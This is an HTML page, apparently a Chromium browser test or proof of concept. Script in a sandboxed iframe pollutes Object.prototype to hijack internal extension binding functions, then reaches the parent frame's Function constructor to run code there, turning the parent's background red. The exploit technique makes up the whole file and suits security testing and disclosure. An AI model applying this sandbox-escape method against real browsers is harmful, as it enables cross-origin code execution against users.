<!doctype html>
<title>Child</title>
<body style="background-color: white;">
This is a sandboxed iframe that manages to set the parent's background color to red.
<script>
var testBinding;
var called = false;
var leaked = Object.create(null);
["run", "binding", "Binding", "loadTypeSchema"].forEach(function(name) {
  Object.defineProperty(Object.prototype, name, {
    configurable: true,
    enumerable: false,
    set: function(func) {
      if(typeof func === "boolean") return;
      if(name === "binding") {
        if(func.assertEq) {
          testBinding = func;
        }
        Object.defineProperty(this, name, { value: func });
        if(func) {
          this.test = function() {};
        }
        return;
      } else if(name === "loadTypeSchema") {
        if(func) {
          Object.defineProperty(this, name, {
            value: function() {
              return { js_module: "test", functions: [] };
            }
          });
          delete Object.prototype[name];
        }
        return;
      }

      leaked[name] = func;
      if(name !== "Binding") {
        delete Object.prototype[name];
      }

      Object.defineProperty(this, name, {
        writable: true,
        configurable: true,
        enumerable: true,
        value: func
      });

      if(name === "Binding" && func.prototype) {
        var old = func.prototype.generate;
        func.prototype.generate = function() {
          if(this.schema_ && (!this.schema_.properties || this.schema_.properties[""])) {
            this.schema_.properties = { "isInstalled": { type: "", value: 1 } };
            this.schema_.namespace = "webstore";
          };
          return old.apply(this, arguments);
        };

        this[name] = func;

        if(!called) {
          called = true;
          func.prototype.generate.call({
            runHooks_: function() {},
            schema_: {
              namespace: "webstore",
              properties: {
                "isInstalled": { type: "", $ref: 1, value: [] }
              }
            }
          });
        }
      }
    }
  });
});

chrome.webstore.onDownloadProgress;

leaked.run("", "", "", function() {
  chrome.runtime.lastError;
}, []);

var parentFunction;
testBinding.runWithModuleSystem(function(x) {
  parentFunction = x.requireNative("v8_context")
                    .GetModuleSystem(parent)
                      // requireNative happens to be disabled in the
                      // cross-origin module system at this point, so
                      // require a module that doesn't call requireNative.
                    .require("test_environment_specific_bindings")
                    .constructor.constructor;
});

parentFunction("document.body.style.backgroundColor = 'red';")();
</script>
</body>
